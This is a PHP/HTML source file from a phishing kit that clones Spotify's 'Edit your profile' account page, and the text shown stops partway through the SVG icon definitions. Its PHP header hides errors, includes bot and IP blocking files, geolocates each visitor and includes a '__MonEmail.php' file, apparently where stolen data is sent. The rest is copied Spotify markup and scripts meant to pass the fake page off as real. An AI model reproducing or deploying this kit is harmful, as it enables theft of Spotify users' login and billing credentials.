<?php
 error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE); @ini_set('html_errors','0'); @ini_set('display_errors','0'); @ini_set('display_startup_errors','0'); @ini_set('log_errors','0');
include "./block-ip/bots.php";  
include "./block-ip/opciones.php";
date_default_timezone_set('UTC');
	$Anon = rand(99999999, 999999999999999999999);
	$Isma = md5(date('l jS \of F Y h:i:s A'));
	$x = "_";
	$z = "=";
	$ip          = $_SERVER['REMOTE_ADDR'];
	$details     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip."");
	$negara      = $details->geoplugin_countryCode;
	$nama_negara = $details->geoplugin_countryName;
	$kode_negara = strtolower($negara);
session_start();
date_default_timezone_set("Africa/Morocco");
include('__MonEmail.php');
$rand = $_GET['dispatch'];

?>
<!DOCTYPE html>
<!-- saved from url=(0102)https://www.spotify.com/us/account/profile/?_ga=2.116762054.178250127.1522973763-1960652065.1522973763 -->
<html lang="en" xmlns:og="http://ogp.me/ns#" xmlns:fb="https://www.facebook.com/2008/fbml" class=" js flexbox canvas no-touch hashchange rgba multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface video audio localstorage svg inlinesvg bgsizecover raf no-flexboxtweener" style=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

          <!--[if !IE]> -->
  <script type="text/javascript" async="" src="./billing_files/cs.js.download"></script><script async="" src="https://connect.facebook.net/en_US/fbevents.js"></script><script type="text/javascript" async="" src="https://static.ads-twitter.com/uwt.js"></script><script type="text/javascript" async="" src="./billing_files/analytics.js.download"></script><script type="text/javascript" async="" src="./billing_files/linkid.js.download"></script><script type="text/javascript" async="" src="./billing_files/js"></script><script type="text/javascript" async="" src="./billing_files/sp-analytics-a3e2493d01.js.download"></script><script async="" src="./billing_files/gtm.js.download"></script><script async="" src="./billing_files/analytics.js.download"></script><script src="./billing_files/jquery-2-0680c441b5.1.3.min.js.download"></script>
<!-- <![endif]-->

<!--[if gte IE 9]>
  <script src="//www.scdn.co/build/js/jquery-2-0680c441b5.1.3.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="//www.scdn.co/build/js/jquery-1-71306af3b2.11.0.min.js"></script>
<![endif]-->
    
          
<style>.async-hide { opacity: 0 !important}</style>
<script>
        window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
      'language': 'en',
      'market': 'us',
      'loggedIn': true,
      'userCountry': 'cz'
    });
        (function(a,s,y,n,c,h,i,d,e){s.className+=' '+y;h.start=1*new Date;
        h.end=i=function(){s.className=s.className.replace(RegExp(' ?'+y),'')};
        (a[n]=a[n]||[]).hide=h;setTimeout(function(){i();h.end=null},c);h.timeout=c;
    })(window,document.documentElement,'async-hide','dataLayer', 2000,{'GTM-P9JKJ53':true});
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
    ga('create', 'UA-5784146-31', 'auto');
        ga('require', 'GTM-P9JKJ53');
        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        '//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-7BJJ');
</script>
    
          
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
      <meta name="description" content="Spotify is a digital music service that gives you access to millions of songs.">
      <meta name="keywords" content="Spotify, music, online, listen, streaming, play, digital, album, artist, playlist">

              <meta property="fb:app_id" content="174829003346">
        <meta property="og:title" content="Music for everyone.">
        <meta property="og:type" content="website">
        <meta property="og:url" content="https://www.spotify.com/us/account/profile/?_ga=2.116762054.178250127.1522973763-1960652065.1522973763">
        <meta property="og:image" content="http://www.scdn.co/i/_global/open-graph-default.png">
        <meta property="og:description" content="Spotify is all the music you’ll ever need.">
                              <meta name="twitter:card" content="summary">
          <meta name="twitter:title" content="Music for everyone.">
          <meta name="twitter:image" content="http://www.scdn.co/i/_global/twitter_card-default.jpg">
          <meta name="twitter:description" content="Spotify is all the music you’ll ever need.">
                
    <title>Edit your profile - Spotify</title>

          <link rel="icon" href="https://www.scdn.co/i/_global/favicon.png">
      <!--[if IE]><link rel="shortcut icon" href="//www.scdn.co/i/_global/favicon.ico"><![endif]-->
    
          <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://www.scdn.co/i/_global/touch-icon-144.png">
      <link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://www.scdn.co/i/_global/touch-icon-114.png">
      <link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://www.scdn.co/i/_global/touch-icon-72.png">
      <link rel="apple-touch-icon-precomposed" href="https://www.scdn.co/i/_global/touch-icon-57.png">
    
          <link rel="canonical" href="https://www.spotify.com/account/profile/?_ga=2.116762054.178250127.1522973763-1960652065.1522973763">
    
      <link rel="stylesheet" href="./billing_files/spotify-b24b86f287.css">
  <link rel="stylesheet" href="./billing_files/account-f4e3384ead.css">

          <script src="./billing_files/modernizr-bc8113e41c.js.download"></script>
            <script>
        Modernizr.addTest('flexboxtweener', Modernizr.testAllProps('flexAlign', 'end', true));
       </script>
      <script>
    (function() {
        var spAnalytics = window.spAnalytics || {};
        spAnalytics._q = [];
        function proxy(fn) {
            spAnalytics[fn] = function() {
                spAnalytics._q.push([fn].concat(Array.prototype.slice.call(arguments, 0)));
            };
        }
        var funcs = ["init", "logEvent", "setUserId", "setUserProperties", "setVersionName", "setDomain", "setGlobalUserProperties"];
        for (var i = 0; i < funcs.length; i++) {
            proxy(funcs[i]);
        }
        window.spAnalytics = spAnalytics;
    })();
</script>
              <script>
    (function(window, document) {
        var s = document.getElementsByTagName('script')[0];
        var as = document.createElement('script');
        as.type = 'text/javascript';
        as.async = true;
        as.src = '//www.scdn.co/build/js/sp-analytics-a3e2493d01.js';
        as.onload = function() { window.spAnalytics.runQueuedFunctions(); };
        s.parentNode.insertBefore(as, s);
    })(window, document);
</script>
        <script>
            spAnalytics.init(null, {apiEndpoint: '/us/spotify/framework/analytics/track/'})
        </script>
        <script src="./billing_files/tracking-2e5455755b.download.js.download"></script>
          
          <script>
        var spweb = spweb || {};
spweb.config = {
  environment: {
    staticUrl: 'https://www.scdn.co'
  },
  sso: {
    host: 'https://accounts.spotify.com'
  },
  www: {
    host: 'www.spotify.com'
  },
  autologin: {
    ios: false,
    android: false,
    desktop_firefox: false,
    desktop_others: false,
    remotetoken: 'NAowChgKB1Nwb3RpZnkSABoGmAEByAEBJcgzx1oSFJmbhbObF2VE8jIFUp9y1diIoASP'
  },
  facebook: {
    appId: 174829003346,
    locale: 'zz',
    version: 'v2.2',
    scopes: 'email,publish_actions,user_birthday,public_profile,user_friends'
  },
  twitter: {
    enable: true
  },
  sheerid: {
    universityUrl: 'https\x3A\x2F\x2Fservices.sheerid.com\x2Frest\x2F0.5\x2Forganization\x3Fcallback\x3D\x3F'
  }
};
      </script>
      <script type="text/javascript" src="./billing_files/sessioncam.recorder.js.download"></script><script type="text/javascript" src="./billing_files/config.aspx"></script></head>

      <body class=" m-us l-en page-account-profile is-loggedin  reboot ">
          <noscript>
  &lt;iframe src="//www.googletagmanager.com/ns.html?id=GTM-7BJJ"
          height="0" width="0" style="display:none;visibility:hidden"&gt;
  &lt;/iframe&gt;
</noscript>
    
        <!--?xml version="1.0" encoding="UTF-8" standalone="no"?-->
<svg xmlns="http://www.w3.org/2000/svg" style="display:none">
 <symbol id="spotify-logo" viewBox="0 0 827.79999 248.275">
  <g transform="matrix(1.25 0 0 -1.25 0 248.28)">
   <g transform="scale(.1)">
    <path d="m1580.6 1105.8c-320.13 190.11-848.16 207.59-1153.8 114.84-49.078-14.89-100.97 12.82-115.84 61.89-14.872 49.1 12.8 100.96 61.914 115.88 350.8 106.49 933.97 85.91 1302.5-132.85 44.14-26.2 58.62-83.21 32.45-127.28-26.18-44.14-83.24-58.69-127.27-32.48zm-10.5-281.56c-22.46-36.449-70.11-47.867-106.51-25.5-266.88 164.05-673.86 211.58-989.6 115.73-40.945-12.367-84.191 10.722-96.629 51.582-12.339 40.949 10.754 84.119 51.629 96.569 360.7 109.45 809.1 56.44 1115.6-131.94 36.4-22.41 47.86-70.078 25.48-106.44zm-121.5-270.43c-17.84-29.258-55.95-38.43-85.1-20.598-233.22 142.54-526.75 174.73-872.45 95.758-33.312-7.629-66.511 13.25-74.109 46.551-7.633 33.312 13.164 66.511 46.555 74.109 378.3 86.48 702.8 49.269 964.57-110.69 29.19-17.832 38.38-55.953 20.53-85.132zm-455.48 1432.4c-548.48 0-993.12-444.6-993.12-993.06 0-548.53 444.64-993.14 993.12-993.14 548.5 0 993.12 444.61 993.12 993.14 0 548.47-444.62 993.1-993.12 993.1"></path>
    <path d="m2701.9 1069.4c-171.46 40.89-202 69.59-202 129.88 0 56.99 53.64 95.31 133.41 95.31 77.32 0 153.98-29.11 234.37-89.05 2.44-1.81 5.48-2.54 8.48-2.06 3 0.45 5.66 2.09 7.41 4.57l83.73 118.03c3.44 4.86 2.5 11.56-2.13 15.27-95.67 76.77-203.4 114.09-329.32 114.09-185.15 0-314.46-111.1-314.46-270.08 0-170.48 111.55-230.83 304.33-277.43 164.08-37.789 191.78-69.449 191.78-126.07 0-62.719-56-101.71-146.11-101.71-100.09 0-181.73 33.719-273.06 112.8-2.27 1.953-5.37 2.851-8.24 2.679-3.02-0.25-5.78-1.648-7.71-3.957l-93.87-111.72c-3.94-4.641-3.44-11.559 1.11-15.578 106.26-94.86 236.94-144.97 377.97-144.97 199.51 0 328.42 109.02 328.42 277.74 0 142.59-85.19 221.45-294.11 272.26"></path>
    <path d="m3592.2 878.31c0-120.4-74.17-204.42-180.36-204.42-105 0-184.19 87.839-184.19 204.42 0 116.57 79.19 204.42 184.19 204.42 104.48 0 180.36-85.949 180.36-204.42zm-144.83 360.22c-86.47 0-157.4-34.06-215.9-103.85v78.56c0 6.19-5.03 11.25-11.22 11.25h-153.53c-6.2 0-11.22-5.06-11.22-11.25v-872.86c0-6.199 5.02-11.25 11.22-11.25h153.53c6.19 0 11.22 5.051 11.22 11.25v275.52c58.51-65.66 129.45-97.726 215.9-97.726 160.69 0 323.34 123.69 323.34 360.14 0 236.5-162.65 360.22-323.34 360.22"></path>
    <path d="m4187.7 672.63c-110.07 0-193.05 88.43-193.05 205.68 0 117.75 80.11 203.19 190.51 203.19 110.77 0 194.31-88.43 194.31-205.76 0-117.72-80.65-203.11-191.77-203.11zm0 565.9c-206.94 0-369.05-159.34-369.05-362.79 0-201.24 161-358.9 366.51-358.9 207.66 0 370.27 158.8 370.27 361.47 0 202-161.49 360.22-367.73 360.22"></path>
    <path d="m4997.3 1224.5h-168.95v172.74c0 6.2-5.01 11.25-11.21 11.25h-153.52c-6.21 0-11.26-5.05-11.26-11.25v-172.74h-73.83c-6.18 0-11.18-5.06-11.18-11.25v-131.95c0-6.2 5-11.25 11.18-11.25h73.83v-341.45c0-137.98 68.67-207.94 204.12-207.94 55.07 0 100.77 11.372 143.83 35.801 3.5 1.949 5.68 5.723 5.68 9.731v125.66c0 3.871-2.03 7.531-5.34 9.57-3.35 2.102-7.51 2.199-10.93 0.5-29.58-14.879-58.18-21.738-90.13-21.738-49.26 0-71.24 22.359-71.24 72.488v317.38h168.95c6.21 0 11.21 5.05 11.21 11.25v131.95c0 6.19-5 11.25-11.21 11.25"></path>
    <path d="m5586 1223.8v21.22c0 62.41 23.92 90.24 77.6 90.24 32.01 0 57.72-6.36 86.52-15.96 3.54-1.12 7.24-0.56 10.12 1.56 2.96 2.12 4.64 5.53 4.64 9.13v129.38c0 4.95-3.18 9.33-7.94 10.78-30.42 9.05-69.33 18.34-127.61 18.34-141.82 0-216.77-79.86-216.77-230.86v-32.49h-73.76c-6.19 0-11.27-5.05-11.27-11.25v-132.62c0-6.2 5.08-11.25 11.27-11.25h73.76v-526.66c0-6.199 5-11.25 11.19-11.25h153.54c6.2 0 11.25 5.051 11.25 11.25v526.66h143.35l219.59-526.52c-24.93-55.329-49.44-66.329-82.91-66.329-27.05 0-55.53 8.071-84.65 24.008-2.75 1.5-5.99 1.762-8.95 0.84-2.93-1.027-5.4-3.207-6.64-6.059l-52.04-114.17c-2.48-5.387-0.36-11.727 4.83-14.528 54.33-29.422 103.37-41.98 163.98-41.98 113.37 0 176.03 52.808 231.28 194.89l266.36 688.3c1.34 3.46 0.94 7.37-1.18 10.44-2.11 3.05-5.51 4.89-9.24 4.89h-159.83c-4.78 0-9.07-3.04-10.63-7.54l-164-467.82-179.3 468.02c-1.64 4.35-5.83 7.23-10.49 7.23h-262.28"></path>
    <path d="m5244.7 1224.5h-153.54c-6.2 0-11.25-5.06-11.25-11.25v-669.86c0-6.199 5.05-11.25 11.25-11.25h153.54c6.19 0 11.25 5.051 11.25 11.25v669.86c0 6.19-5.06 11.25-11.25 11.25"></path>
    <path d="m5168.7 1529.5c-60.82 0-110.19-49.24-110.19-110.06 0-60.87 49.37-110.16 110.19-110.16 60.8 0 110.11 49.29 110.11 110.16 0 60.82-49.31 110.06-110.11 110.06"></path>
    <path d="m6520.1 1157.9h-28.14v-35.88h28.14c14.04 0 22.42 6.87 22.42 17.95 0 11.67-8.38 17.93-22.42 17.93zm18.23-51.18 30.57-42.79h-25.77l-27.51 39.25h-23.66v-39.25h-21.57v113.42h50.58c26.34 0 43.68-13.48 43.68-36.18 0-18.59-10.74-29.95-26.32-34.45zm-23.95 108.37c-55.35 0-97.23-43.99-97.23-97.87 0-53.84 41.58-97.25 96.66-97.25 55.33 0 97.25 43.96 97.25 97.87 0 53.84-41.61 97.25-96.68 97.25zm-0.57-205.93c-60.76 0-108.05 48.8-108.05 108.06 0 59.27 47.9 108.62 108.62 108.62 60.76 0 108.04-48.79 108.04-108 0-59.27-47.86-108.68-108.61-108.68"></path>
   </g>
  </g>
 </symbol>
 <symbol id="facebook-icon" viewBox="0 0 448 448">
  <path d="m119.75 242.25v-74h63.75v-54.5q0-46.5 26-72.125t69.25-25.625q36.75 0 57 3v66h-39.25q-21.5 0-29 9t-7.5 27v47.25h73.25l-9.75 74h-63.5v189.75h-76.5v-189.75h-63.75z"></path>
 </symbol>
 <symbol id="twitter-icon" viewBox="0 0 448 448">
  <path d="m27 347.75q8.75 1 19.5 1 56.25 0 100.25-34.5-26.25-0.5-47-16.125t-28.5-39.875q8.25 1.25 15.25 1.25 10.75 0 21.25-2.75-28-5.75-46.375-27.875t-18.375-51.375v-1q17 9.5 36.5 10.25-16.5-11-26.25-28.75t-9.75-38.5q0-22 11-40.75 30.25 37.25 73.625 59.625t92.875 24.875q-2-9.5-2-18.5 0-33.5 23.625-57.125t57.125-23.625q35 0 59 25.5 27.25-5.25 51.25-19.5-9.25 28.75-35.5 44.5 23.25-2.5 46.5-12.5-16.75 24.5-40.5 41.75 0.25 3.5 0.25 10.5 0 32.5-9.5 64.875t-28.875 62.125-46.125 52.625-64.5 36.5-80.75 13.625q-67.75 0-124-36.25z"></path>
 </symbol>
 <symbol id="instagram-icon" viewBox="0 0 448 448">
   <path d="M224,40.376 C283.808,40.376 290.901333,40.6 314.533333,41.6826667 C375.237333,44.4453333 403.592,73.248 406.354667,133.504 C407.437333,157.117333 407.642667,164.210667 407.642667,224.018667 C407.642667,283.845333 407.418667,290.92 406.354667,314.533333 C403.573333,374.733333 375.293333,403.592 314.533333,406.354667 C290.901333,407.437333 283.845333,407.661333 224,407.661333 C164.192,407.661333 157.098667,407.437333 133.485333,406.354667 C72.632,403.573333 44.4266667,374.64 41.664,314.514667 C40.5813333,290.901333 40.3573333,283.826667 40.3573333,224 C40.3573333,164.192 40.6,157.117333 41.664,133.485333 C44.4453333,73.248 72.7253333,44.4266667 133.485333,41.664 C157.117333,40.6 164.192,40.376 224,40.376 L224,40.376 Z M224,-1.57772181e-30 C163.165333,-1.57772181e-30 155.549333,0.261333333 131.656,1.344 C50.3066667,5.07733333 5.096,50.2133333 1.36266667,131.637333 C0.261333333,155.549333 -9.06682137e-15,163.165333 -9.06682137e-15,224 C-9.06682137e-15,284.834667 0.261333333,292.469333 1.344,316.362667 C5.07733333,397.712 50.2133333,442.922667 131.637333,446.656 C155.549333,447.738667 163.165333,448 224,448 C284.834667,448 292.469333,447.738667 316.362667,446.656 C397.637333,442.922667 442.96,397.786667 446.637333,316.362667 C447.738667,292.469333 448,284.834667 448,224 C448,163.165333 447.738667,155.549333 446.656,131.656 C442.997333,50.3813333 397.805333,5.096 316.381333,1.36266667 C292.469333,0.261333333 284.834667,-9.06682137e-15 224,-9.06682137e-15 L224,-1.57772181e-30 Z M224,108.976 C160.477333,108.976 108.976,160.477333 108.976,224 C108.976,287.522667 160.477333,339.042667 224,339.042667 C287.522667,339.042667 339.024,287.541333 339.024,224 C339.024,160.477333 287.522667,108.976 224,108.976 Z M224,298.666667 C182.765333,298.666667 149.333333,265.253333 149.333333,224 C149.333333,182.765333 182.765333,149.333333 224,149.333333 C265.234667,149.333333 298.666667,182.765333 298.666667,224 C298.666667,265.253333 265.234667,298.666667 224,298.666667 Z M343.578667,77.56 C328.72,77.56 316.68,89.6 316.68,104.44 C316.68,119.28 328.72,131.32 343.578667,131.32 C358.418667,131.32 370.44,119.28 370.44,104.44 C370.44,89.6 358.418667,77.56 343.578667,77.56 Z"></path>
 </symbol>
 <symbol id="user-icon" viewBox="0 0 1024 1024">
  <path d="m730.06 679.64q-45.377 53.444-101.84 83.443t-120 29.999q-64.032 0-120.75-30.503t-102.6-84.451q-40.335 13.109-77.645 29.747t-53.948 26.722l-17.142 10.084q-29.747 19.159-51.175 57.729t-21.428 73.107 25.461 59.242 60.754 24.705h716.95q35.293 0 60.754-24.705t25.461-59.242-21.428-72.603-51.679-57.225q-6.554-4.033-18.907-10.84t-51.427-24.453-79.409-30.755zm-221.84 25.72q-34.285 0-67.561-14.873t-60.754-40.335-51.175-60.502-40.083-75.124-25.461-84.451-9.075-87.728q0-64.032 19.915-116.22t54.452-85.964 80.67-51.931 99.072-18.151 99.072 18.151 80.67 51.931 54.452 85.964 19.915 116.22q0 65.04-20.167 130.58t-53.948 116.72-81.426 83.443-98.568 32.268z"></path>
 </symbol>
<symbol id="chevron-down" viewBox="0 0 1024 1024">
  <path class="path1" d="M476.455 806.696l-381.164-381.164q-14.621-14.621-14.621-35.293t14.621-34.789 35.293-14.117 34.789 14.117l342.846 343.35 349.4-349.4q14.621-14.117 35.293-14.117t34.789 14.117 14.117 34.789-14.117 34.789l-381.164 381.164q-19.159 19.159-38.318 19.159t-31.764-12.605z"></path>
</symbol>
<symbol id="scroll-down" viewBox="643.5 386 22.1 21.9">
  <path d="M665.6,396.3c0,0.3-0.1,0.7-0.4,0.9l-9.8,10.4c-0.5,0.5-1.3,0.5-1.7,0l-9.8-10.4c-0.5-0.5-0.5-1.3,0-1.8
    s1.3-0.5,1.7,0l8.9,9.5l8.9-9.5c0.5-0.5,1.3-0.5,1.7,0C665.5,395.6,665.6,396,665.6,396.3z">
  <path d="M665.6,387.3c0,0.3-0.1,0.7-0.4,0.9l-9.8,10.4c-0.5,0.5-1.3,0.5-1.7,0l-9.8-10.4c-0.5-0.5-0.5-1.3,0-1.8
    s1.3-0.5,1.7,0l8.9,9.5l8.9-9.5c0.5-0.5,1.3-0.5,1.7,0C665.5,386.6,665.6,387,665.6,387.3z">
</path></path></symbol>
</svg>
  
          <div id="fb-root"></div>
    
      <div class="wrap">

            
<header id="js-navbar" class="navbar navbar-default navbar-static-top " role="banner">
    <div class="container">
    <div class="navbar-header">

              <button type="button" class="navbar-toggle collapsed" data-toggle="sidepanel" data-target="#navbar-nav">
          <span class="sr-only">Toggle navigation</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
      
            <ul class="nav">
        <li class="dropdown">
          <a href="https://www.spotify.com/us/account/overview/" class="user-link dropdown-toggle hidden-xs hidden-sm" data-toggle="dropdown">
              
    <div class="user-icon-container img-circle navbar-user-img">
      <svg class="user-icon">
        <use xlink:href="#user-icon">
      </use></svg>
    </div>

  
          </a>
          <a href="https://www.spotify.com/us/account/overview/" class="user-link hidden-md hidden-lg" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;account&quot;}">
              
    <div class="user-icon-container img-circle navbar-user-img">
      <svg class="user-icon">
        <use xlink:href="#user-icon">
      </use></svg>
    </div>

  
          </a>
          <ul class="dropdown-menu dropdown-menu-right">
            <li>
              <a href="https://www.spotify.com/us/account/overview/" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;account&quot;}">Account</a>
            </li>
            <li>
              <a href="https://www.spotify.com/us/logout/" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;log-out&quot;}">Log Out</a>
            </li>
          </ul>
        </li>
      </ul>
            <a href="https://www.spotify.com/login?continue=https%3A%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F" class="user-link hidden ">
          
    <div class="user-icon-container img-circle navbar-user-img">
      <svg class="user-icon">
        <use xlink:href="#user-icon">
      </use></svg>
    </div>

  
      </a>
      <a class="navbar-brand" href="https://www.spotify.com/us/" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;spotify-logo&quot;}">
        <span class="navbar-logo">Spotify</span>
      </a>
    </div>
          <nav class="collapse navbar-collapse" id="navbar-nav" role="navigation">
        
<ul class="nav navbar-nav navbar-right nav-main">

    
        <li>
    <a href="https://www.spotify.com/us/premium/?checkout=false" id="nav-link-premium" data-ga-category="menu" data-ga-action="premium">
      Premium
                </a>
  </li>

  
    <li>
    <a href="https://support.spotify.com/?utm_source=www.spotify.com&amp;utm_medium=www_header" id="nav-link-help" data-ga-category="menu" data-ga-action="help">
      Help
                </a>
  </li>


      
<li>
  <a href="https://www.spotify.com/us/download/" id="nav-link-download" class="js-get-spotify js-gtm-event" data-ga-category="menu" data-ga-action="download" data-gtm-event-name="download_spotify_button_clicked" data-tracking="{&quot;category&quot;: &quot;download&quot;, &quot;action&quot;: &quot;download start&quot;, &quot;label&quot;: &quot;download-navbar&quot;}">Download
   </a>
</li>
  
  <li role="separator" class="divider"></li>

  
        <li class="alternate sidepanel-item-small hidden-md hidden-lg ">
    <a href="https://www.spotify.com/us/account/overview/" id="nav-link-account" data-ga-category="menu" data-ga-action="account">
      Account
                </a>
  </li>

      <li class="alternate sidepanel-item-small hidden-md hidden-lg ">
    <a href="https://www.spotify.com/us/logout/" id="nav-link-log-out" data-ga-category="menu" data-ga-action="log-out">
      Log Out
                </a>
  </li>

  
      
  
  <li class="dropdown alternate hidden-sidepanel">
    <a href="https://www.spotify.com/us/account/overview/" class="user-link dropdown-toggle" data-toggle="dropdown">
        
    <div class="user-icon-container img-circle navbar-user-img">
      <svg class="user-icon">
        <use xlink:href="#user-icon">
      </use></svg>
    </div>

  
      <span class="user-text">Profile</span>
      <svg class="svg-chevron-down"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#chevron-down"></use></svg>
    </a>
    <ul class="dropdown-menu dropdown-menu-right">
            <li>
        <a href="https://www.spotify.com/us/account/overview/" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;account&quot;}">Account</a>
      </li>
      <li>
        <a href="https://www.spotify.com/us/logout/" class="logout-link" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;log-out&quot;}">Log Out</a>
      </li>
    </ul>
  </li>
  </ul>
      </nav>
      </div>
</header>
    

          


    
    
      <svg display="none" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <defs>
  <symbol id="icon-locked" viewBox="0 0 1024 1024">
    <title>locked</title>
    <path class="path1" d="M762.328 378.139q0-49.41-19.411-94.787t-51.931-78.149-77.392-52.183-94.283-19.411h-22.184q-28.234 0-55.46 6.302t-51.175 18.403-45.125 28.739-37.814 37.814-28.739 45.125-18.403 51.175-6.302 55.46v74.619q-26.722 3.529-45.125 23.949t-18.403 47.645v298.478q0 19.663 9.832 36.553t26.722 26.722 36.553 9.832h489.060q19.663 0 36.553-9.832t26.722-26.722 9.832-36.553v-296.965q0-18.151-8.571-33.78t-23.193-25.461-31.764-12.353v-74.619zM519.311 197.136q36.301 0 69.578 14.369t57.225 38.318 38.318 57.225 14.369 69.578v74.619h-381.164v-74.619q0-36.301 14.369-69.578t38.318-57.225 57.225-38.318 69.578-14.369h22.184z"></path>
  </symbol>
  <symbol id="icon-notifications" viewBox="0 0 1024 1024">
    <title>notifications</title>
    <path class="path1" d="M508.219 1022.992q35.797 0 65.544-18.403t46.385-49.158q-27.226 2.017-55.208 3.025t-56.721 1.008q-56.973 0-111.929-4.033 16.638 30.755 46.385 49.158t65.544 18.403zM828.88 406.877q-3.025-33.78-14.117-66.3t-28.991-60.754-41.343-52.435-51.679-43.108-59.494-30.503q1.008-6.554 1.513-11.092t0.504-9.075q0-52.435-37.31-89.745t-89.745-37.31-89.745 37.31-37.31 89.745q0 7.059 2.017 20.167-79.661 30.755-133.861 99.577t-61.763 153.524l-25.209 282.344q-23.193 8.067-41.343 17.394t-31.007 19.159-19.663 20.924-6.806 22.184q0 34.285 59.494 63.779t161.843 46.385 223.354 16.89 223.354-16.89 161.843-46.385 59.494-63.779q0-15.126-11.848-29.243t-33.78-26.722-53.192-23.697l-25.209-282.344zM508.219 53.948q32.772 0 56.217 23.445t23.445 56.217q0 1.008-0.504 2.017t-0.756 2.017-0.252 1.513q-28.234-5.546-56.469-5.546h-43.36q-28.234 0-56.469 6.050 0-1.008-0.756-3.025t-0.756-3.025q0-16.134 6.302-30.755t17.142-25.461 25.461-17.142 30.755-6.302z"></path>
  </symbol>
  <symbol id="icon-refresh" viewBox="0 0 1024 1024">
    <title>refresh</title>
    <path class="path1" d="M872.744 514.773v-0.504q0-74.115-28.739-141.676t-77.897-116.719-116.719-78.149-141.676-28.991q-123.525 0-221.841 75.124-90.249 69.578-125.542 177.473-17.646 54.956-18.151 112.937 0 74.115 28.991 141.676t78.149 116.719 116.719 77.897 141.676 28.739q37.814 0 74.367-7.311t70.838-22.436q18.151-8.067 25.461-26.47t-0.756-36.049q-3.529-9.075-10.588-15.63t-15.378-9.832-17.899-3.277-18.655 4.033q-51.427 21.68-107.391 21.68-54.956 0-104.871-21.176t-85.964-57.477-57.477-86.216-21.428-104.871q0-36.806 9.58-71.594t26.974-64.536 42.352-54.704 54.704-42.352 64.536-27.226 71.594-9.832q54.956 0 104.871 21.428t86.216 57.729 57.729 86.468 21.428 105.123h-104.366q-16.134 0-19.411 7.815t7.815 18.907l136.634 136.634q11.092 11.092 26.974 11.092t26.974-11.092l136.634-136.634q7.563-7.059 8.571-13.361t-4.033-9.832-15.63-3.529h-105.375z"></path>
  </symbol>
  <symbol id="icon-home" viewBox="0 0 1024 1024">
    <title>home</title>
    <path class="path1" d="M635.273 895.937v-254.109q0-26.218-18.655-44.872t-44.872-18.655h-127.055q-26.218 0-44.872 18.655t-18.655 44.872v254.109h-190.582v-380.66l-63.527 45.377v335.283q0 26.218 18.655 44.872t44.872 18.655h635.273q26.218 0 44.872-18.655t18.655-44.872v-335.283l-63.527-45.377v380.66h-190.582zM582.838 138.147q-20.672-14.621-47.645-19.915t-53.948 0-47.645 19.915l-393.264 280.831q-13.109 9.58-15.882 25.713t6.806 29.495 25.713 16.134 29.747-6.806l392.76-280.831q11.092-7.563 28.739-7.563t28.739 7.563l392.76 280.831q10.588 7.563 23.193 7.563 20.672 0 32.268-16.638 9.58-13.613 6.806-29.747t-15.882-25.713l-393.264-280.831z"></path>
  </symbol>
  <symbol id="icon-edit" viewBox="0 0 1024 1024">
    <title>edit</title>
    <path class="path1" d="M751.236 461.329q-28.234 28.234-75.628 20.167t-86.72-47.393-47.393-86.72 20.167-75.628l-0.504-0.504-325.704 325.704q-18.655 18.655-38.57 49.158t-29.999 54.704l-79.661 199.657q-3.529 9.075-4.286 16.638t1.26 12.605 6.806 7.815 11.344 2.773q9.075 0 20.167-4.538l199.657-79.661q16.134-6.554 35.797-17.899t37.814-24.957 30.251-25.713l325.704-325.704-0.504-0.504zM149.239 873.753l62.015-155.289q8.067-19.663 25.461-46.133t32.52-41.595l31.259-31.259q10.588 43.36 45.125 77.897t77.897 45.125l-31.259 31.259q-15.126 15.126-41.595 32.52t-46.133 25.461l-155.289 62.015zM908.037 114.954q-23.697-23.697-51.679-36.301t-54.2-12.605q-34.789 0-56.469 21.68l-0.504-0.504-115.963 115.963v0.504q-27.73 28.234-19.663 75.628t47.393 86.72 86.72 47.393 75.628-20.167l0.504 0.504 115.963-115.963-0.504-0.504q9.075-9.075 14.621-21.428t6.806-25.713-1.26-28.234-8.571-29.747-16.134-29.495-22.688-27.73zM802.159 97.812q13.613 0 28.234 4.79t28.739 13.613 26.218 21.428q32.268 31.764 38.822 69.578 0.504 5.042 0.756 10.336t-0.504 12.1-3.529 13.361-7.815 11.596q-12.1 12.1-34.285 12.1-20.167 0-42.352-10.336t-40.839-28.991q-19.159-19.159-29.747-42.099t-10.084-43.108 12.605-32.268 33.78-12.1z"></path>
  </symbol>
  <symbol id="icon-offline" viewBox="0 0 1024 1024">
    <title>offline</title>
